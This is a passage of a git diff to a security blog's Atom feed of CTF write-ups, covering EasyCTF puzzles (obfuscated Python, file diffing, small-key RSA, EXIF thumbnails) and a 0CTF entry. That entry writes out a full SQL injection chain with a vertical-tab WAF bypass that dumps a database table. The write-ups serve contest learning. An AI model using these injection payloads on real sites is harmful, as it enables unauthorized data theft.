+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(52)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(56)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(51)+chr(41)+chr(41))</div><div class="line"></div><div class="line">=== pass n°2 ===</div><div class="line">exec(chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(39)+chr(101)+chr(97)+chr(115)+chr(121)+chr(99)+chr(116)+chr(102)+chr(123)+chr(112)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110)+chr(95)+chr(51)+chr(120)+chr(51)+chr(99)+chr(95)+chr(101)+chr(120)+chr(101)+chr(99)+chr(95)+chr(51)+chr(120)+chr(101)+chr(99)+chr(95)+chr(101)+chr(120)+chr(51)+chr(99)+chr(125)+chr(39)+chr(10)+chr(112)+chr(114)+chr(105)+chr(105)+chr(110)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103))</div><div class="line"></div><div class="line">=== pass n°3 ===</div><div class="line">flag = &apos;easyctf&#123;python_3x3c_exec_3xec_ex3c&#125;&apos;</div><div class="line">priint flag</div></pre></td></tr></table></figure></p>
+<h2 id="75-petty-difference-forensics">75 - Petty Difference - Forensics</h2>
+<blockquote>
+<p>I found two files in a secret room. They look like jumbled letters with no patterns. I mean look at it! <a href="https://www.easyctf.com/static/4b44b334ac0ff0a281597fb66c6f78bc8f5d537e_file1.txt" target="_blank" rel="external">file1</a> is identical to <a href="https://www.easyctf.com/static/d1de718973b070b1c12b78cef89d21ded505f9f0_file2.txt" target="_blank" rel="external">file2</a>, right?</p>
+</blockquote>
+<p>Ok so let's compare the two files:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">$ cmp -bl file1.txt file2.txt</div><div class="line">   482 175 &#125;    154 l</div><div class="line">  1638  64 4    146 f</div><div class="line">  1796 137 _    142 b</div><div class="line">  2240 147 g    172 z</div><div class="line">  3157 156 n     71 9</div><div class="line">  3303  61 1     65 5</div><div class="line">  3568 153 k    145 e</div><div class="line">  3892  60 0    157 o</div><div class="line">  3911  60 0    142 b</div><div class="line">  4501 154 l    143 c</div><div class="line">  5204 137 _    162 r</div><div class="line">  5582  63 3    164 t</div><div class="line">  6107 162 r    161 q</div><div class="line">  6563  63 3    141 a</div><div class="line">  7043 167 w    144 d</div><div class="line">  7196 137 _    164 t</div><div class="line">  8269 165 u     67 7</div><div class="line">  8866  60 0    153 k</div><div class="line">  9164 171 y    144 d</div><div class="line">  9965 137 _    170 x</div><div class="line"> 10771  63 3    172 z</div><div class="line"> 11220 143 c     60 0</div><div class="line"> 11283 156 n    144 d</div><div class="line"> 11285  63 3    143 c</div><div class="line"> 11666 162 r    151 i</div><div class="line"> 13337  63 3    163 s</div><div class="line"> 14816 146 f    167 w</div><div class="line"> 15168 146 f    173 &#123;</div><div class="line"> 15180  61 1    170 x</div><div class="line"> 15366 144 d     65 5</div><div class="line"> 15656 137 _    153 k</div><div class="line"> 16168  63 3    151 i</div><div class="line"> 17651 150 h    153 k</div><div class="line"> 17761 164 t     64 4</div><div class="line"> 18186 137 _    160 p</div><div class="line"> 18261  63 3    165 u</div><div class="line"> 18592 142 b    145 e</div><div class="line"> 18739 137 _    162 r</div><div class="line"> 19676 171 y    151 i</div><div class="line"> 20033  64 4    151 i</div><div class="line"> 20228 155 m    145 e</div><div class="line"> 20246 137 _    142 b</div><div class="line"> 23511 163 s    155 m</div><div class="line"> 24001  61 1    141 a</div><div class="line"> 24487 150 h    166 v</div><div class="line"> 24845 164 t    167 w</div><div class="line"> 25291 173 &#123;    156 n</div><div class="line"> 25411 146 f    170 x</div><div class="line"> 25491 164 t    144 d</div><div class="line"> 25502 143 c    166 v</div><div class="line"> 25673 171 y    167 w</div><div class="line"> 26410 163 s    145 e</div><div class="line"> 27127 141 a    170 x</div><div class="line"> 27132 145 e     71 9</div></pre></td></tr></table></figure></p>
+<p>It seems that we got the flag (reverse order of the diff from first file), but let's write a ruby script to make it easier to copy:</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="comment"># empty array</span></div><div class="line">flag = []</div><div class="line"></div><div class="line"><span class="comment"># generate diff.txt : cmp -bl file1.txt file2.txt &gt; diff.txt</span></div><div class="line">open(<span class="string">'diff.txt'</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">    <span class="comment"># split lines</span></div><div class="line">    lines = f.read().split(<span class="string">"\n"</span>)</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines</div><div class="line">        <span class="comment"># split columns</span></div><div class="line">        words = line.split(<span class="string">' '</span>)</div><div class="line">        flag.push(words[<span class="number">2</span>])</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts flag.reverse.join</div></pre></td></tr></table></figure></p>
+<p>Let's try it:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ruby diff.rb</div><div class="line">easyctf&#123;th1s_m4y_b3_th3_d1ff3r3nc3_y0u_w3r3_l00k1ng_4&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="80-rsa-2-cryptography">80 - RSA 2 - Cryptography</h2>
+<blockquote>
+<p>Some more RSA! This time, there's no P and Q... <a href="https://www.easyctf.com/static/e583c3cc832e2f8394a89f15e034a45574a63365_ciphertext2.txt" target="_blank" rel="external">this</a>.</p>
+</blockquote>
+<p>Let's see how it looks this tiem:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat ciphertext2.txt</div><div class="line">n: 292977443899368435277959020404942780635643</div><div class="line">e: 65537</div><div class="line">c: 116661734456209126203156567366346251672660</div></pre></td></tr></table></figure></p>
+<p>This time we got <code>n</code> but not <code>p</code> and <code>q</code>.</p>
+<p>Maybe <a href="https://factordb.com/index.php?query=292977443899368435277959020404942780635643" target="_blank" rel="external">factordb</a> can help us: <code>292977443899368435277959020404942780635643 = 471665935909122708917 · 621154553666596093679</code>.</p>
+<p>We can now use the same script (from RSA 1 challenge).</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2</span></div><div class="line"></div><div class="line"><span class="comment"># credit : http://jhafranco.com/2012/01/29/rsa-implementation-in-python/</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2Text</span><span class="params">(number, size)</span>:</span></div><div class="line">    text = <span class="string">""</span>.join([chr((number &gt;&gt; j) &amp; <span class="number">0xff</span>)</div><div class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> reversed(range(<span class="number">0</span>, size &lt;&lt; <span class="number">3</span>, <span class="number">8</span>))])</div><div class="line">    <span class="keyword">return</span> text.lstrip(<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># credit : http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        g, y, x = egcd(b % a, a)</div><div class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> x % m</div><div class="line"></div><div class="line">p = <span class="number">471665935909122708917</span></div><div class="line">q = <span class="number">621154553666596093679</span></div><div class="line">e = <span class="number">65537</span></div><div class="line">c = <span class="number">116661734456209126203156567366346251672660</span></div><div class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</div><div class="line">d = modinv(e, phi)</div><div class="line">n = p*q</div><div class="line"></div><div class="line">m_int = pow(c,d,n)</div><div class="line"></div><div class="line"><span class="keyword">print</span> int2Text(m_int, len(str(m_int)))</div></pre></td></tr></table></figure></p>
+<p>Output:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python2 rsa2.py</div><div class="line">flag&#123;l0w_n_79c0&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="85-zooooooom-forensics">85 - Zooooooom - Forensics</h2>
+<blockquote>
+<p><a href="https://www.easyctf.com/static/d9040024afd9d38b73c72e30f722cf09e1093e3c_hekkerman.jpg" target="_blank" rel="external">Hekkerman</a> is looking awfully spooky. That hekker glare could pierce a firewall. What can he see that you can't?</p>
+</blockquote>
+<p>Image:</p>
+<p><img src="http://i.imgur.com/HdmaNou.jpg" alt="image"></p>
+<p>We can see there is a thumbnail, let's extract it. But the thumbnail itself have a thumbnail:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ exiftool -b -ThumbnailImage hekkerman.jpg &gt; thumbnail.jpg</div><div class="line">$ exiftool -b -ThumbnailImage thumbnail.jpg &gt; thumbnail_thumbnail.jpg</div></pre></td></tr></table></figure></p>
+<p>Thumbnail:</p>
+<p><img src="http://i.imgur.com/R1WBI21.jpg" alt="thumbnail"></p>
+<p>Thumbnail of the thumbnail:</p>
+<p><img src="http://i.imgur.com/v5LWUDs.jpg" alt="thumbnail thumbnail"></p>
+<p>Flag is: <code>easyctf{d33p_zo0m_HeKker_2c1ae5}</code>.</p>
+<p><strong>Note</strong>: this is Steganography not Digital Forensics.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="programming" scheme="https://rawsec.ml/tags/programming/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
+    
+      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
+    
+      <category term="reversing" scheme="https://rawsec.ml/tags/reversing/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>0CTF 2017 Quals - Write-ups</title>
+    <link href="https://rawsec.ml/en/0CTF-2017-write-ups/"/>
+    <id>https://rawsec.ml/en/0CTF-2017-write-ups/</id>
+    <published>2017-03-20T23:00:00.000Z</published>
+    <updated>2017-03-21T22:21:12.327Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : 0CTF 2017 Quals</li>
+<li><strong>Website</strong> : <a href="https://ctf.0ops.net/" target="_blank" rel="external">ctf.0ops.net</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/402" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="welcome-misc">Welcome - Misc</h2>
+<blockquote>
+<p>Welcome to 0CTF 2017~</p>
+<p>irc: <a href="http://irc.freenode.net" target="_blank" rel="external">irc.freenode.net</a> #0ctf2017</p>
+</blockquote>
+<p><code>flag{Welcome_to_0CTF_2017}</code></p>
+<h2 id="simplesqlin-web">simplesqlin - Web</h2>
+<blockquote>
+<p><a href="http://202.120.7.203" target="_blank" rel="external">http://202.120.7.203</a></p>
+</blockquote>
+<p>The injectable request: <code>http://202.120.7.203/index.php?id=3</code>.</p>
+<p>Keywords blocked:</p>
+<ul>
+<li><code>SELECT</code>, <code>sElEcT</code>, <code>%53elect</code>, <code>sel/**/ect</code> (not blocked but doesn't work), <code>/*!%53eLEct*/</code></li>
+<li><code>FROM</code></li>
+<li><code>WHERE</code></li>
+</ul>
+<p><code>?id=2 order by 3</code> works and <code>?id=2 order by 4</code> doesn't so there is 3 columns in the actual table.</p>
+<p>Keywords blocked need to be escaped, so we need to try some WAF bypass techniques. As you can see in the previous part (<em>Keywords blocked</em>), a lot of tricks don't work but I find one that is working: <code>se%0blect</code>, injecting a character that does nothing in our context like <code>%0b</code> (vertical tab) or <code>%07</code> (bell).</p>
+<p><code>?id=99999 UNION SEL%0bECT 1,2,3</code> 99999 is an out of range id so the <code>UNION</code> statement is executed. <code>2</code> is displayed in the <code>&lt;h3&gt;&lt;/h3&gt;</code>, <code>3</code> is displayed in the <code>&lt;div class=&quot;main&quot;&gt;3&lt;/div&gt;</code> and <code>1</code> is displayed in the link <code>&lt;a href=&quot;index.php?id=1&quot;&gt;</code>.</p>
+<p>Now let's identify the databse:</p>
+<ul>
+<li><code>?id=99999 UNION SEL%0bECT 1,user(),version()</code>: user: <code>news@localhost</code>, version: <code>5.7.17-0ubuntu0.16.04.1</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,database(),3</code>: database: <code>news</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,table_name,3 FR%0bOM information_schema.tables W%0bHERE table_schema = 'news'</code>: table name: <code>flag</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 0,1 -- -</code>: 1st column name: <code>flag</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 1,1 -- -</code>: there is only 1 column</li>
+<li><code>?id=99999 UNION SEL%0bECT 1,flag,3 fr%0bom news.flag</code>: flag: <code>flag{W4f_bY_paSS_f0R_CI}</code></li>
+</ul>
+<p>References: <a href="http://sechow.com/bricks/docs/content-page-1.html" target="_blank" rel="external">1</a> - <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#SQLi" target="_blank" rel="external">2</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
   
   <entry>
     <title>Pragyan CTF 2017 - Write-ups</title>
@@ -216,7 +578,7 @@ You have got hold of the map, but it looks nothing more than a plain white sheet
     <link href="https://rawsec.ml/en/WhiteHat-Challenge-2017-20-For001-Forensics/"/>
     <id>https://rawsec.ml/en/WhiteHat-Challenge-2017-20-For001-Forensics/</id>
     <published>2017-02-26T23:00:00.000Z</published>
-    <updated>2017-02-27T18:56:27.378Z</updated>
+    <updated>2017-03-21T22:24:32.344Z</updated>
     
     <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
 <h3 id="version">Version</h3>
@@ -290,7 +652,7 @@ Download file here:</p>
     
       <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
-      <category term="forencics" scheme="https://rawsec.ml/tags/forencics/"/>
+      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
     
   </entry>
   
@@ -961,104 +1323,6 @@ Download file here:</p>
   </entry>
   
   <entry>
-    <title>AlexCTF 2017 - Write-ups</title>
-    <link href="https://rawsec.ml/en/AlexCTF-2017-write-ups/"/>
-    <id>https://rawsec.ml/en/AlexCTF-2017-write-ups/</id>
-    <published>2017-02-04T23:00:00.000Z</published>
-    <updated>2017-02-07T21:03:11.491Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : AlexCTF 2017</li>
-<li><strong>Website</strong> : <a href="https://ctf.oddcoder.com/" target="_blank" rel="external">ctf.oddcoder.com</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/408/" target="_blank" rel="external">link</a></li>
-</ul>
-<h2 id="10-tr1-hello-there-trivia">10 - TR1: Hello there - Trivia</h2>
-<blockquote>
-<p>Why not drop us a few lines and say hi :).</p>
-</blockquote>
-<p>Go to the irc: <code>#alexctf @freenode</code> and get the flag with <code>/topic</code>.</p>
-<h2 id="20-tr2-ssl-0day-trivia">20 - TR2: SSL 0day - Trivia</h2>
-<blockquote>
-<p>It lead to memory leakage between servers and clients rending large number of private keys accessible. (one word)</p>
-</blockquote>
-<p>Answer: <strong>heartbleed</strong> (<a href="http://heartbleed.com/" target="_blank" rel="external">details</a>)</p>
-<h2 id="30-tr3-ca-trivia">30 - TR3: CA - Trivia</h2>
-<blockquote>
-<p>What is the CA that issued Alexctf https certificate</p>
-<p>(flag is lowercase with no spaces)</p>
-</blockquote>
-<p>Answer: <strong>letsencrypt</strong></p>
-<h2 id="40-tr4-doesn-t-our-logo-look-cool-trivia">40 - TR4: Doesn't our logo look cool ? - Trivia</h2>
-<p>Here is the logo:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&apos;@+.                                                                                          </div><div class="line">@@@@@@@:                                                                                        </div><div class="line">@@@@@@@@@#                                                                                       </div><div class="line">@@@@@@@@@@@,                                                                                      </div><div class="line">&apos;@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@.                                                                                     </div><div class="line">@@@@@@@@@@@@@,                                                                                     </div><div class="line">@@@@A@@@@@@@@                                                                                      </div><div class="line">+@@@@@@@@@@@@                       .:++@@@@@+:.                                                   </div><div class="line">@@@@@@@@@@@&apos;                .+@@@@@@@@@@@@@@@@@@@@@`                                              </div><div class="line">.@@@@@@@@@@            .#@@@@@@@@@@@@@@L@@@@@@@@@@@@@#                                            </div><div class="line">+@@@@@@@@         `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                   .@@.   </div><div class="line">+@@@E@@@@      .@@@@@@X@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                              &apos;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@C@@.                       `+@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@T@@@@@@@@@@@&apos;,`       .+@@@@@@@@@@@@@@@:              `:@@@@@@F@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@+.                    ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@,                           `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                               +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                   ;@@@@@@@@@@@@&#123;@@@@@@@@@@@#,   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                       &apos;@@@@@@@@@@@@@@+,         ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                        :;.                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    @     ;@       @@@@@@@  @`   `@   +@@#@@  &apos;@@@@@@@  @@@@@@@, ;@@@0@.   </div><div class="line">+@@@@U@@@      ;@@@@@.    @+    ;@       @        .@   @,   @    #@    `@     @        ;@@@@@.   </div><div class="line">+@@@@@R@@      ;@@@@@.   .@@    ;@       @         @` `@   :@     @    `@     @        ;@@@_@.   </div><div 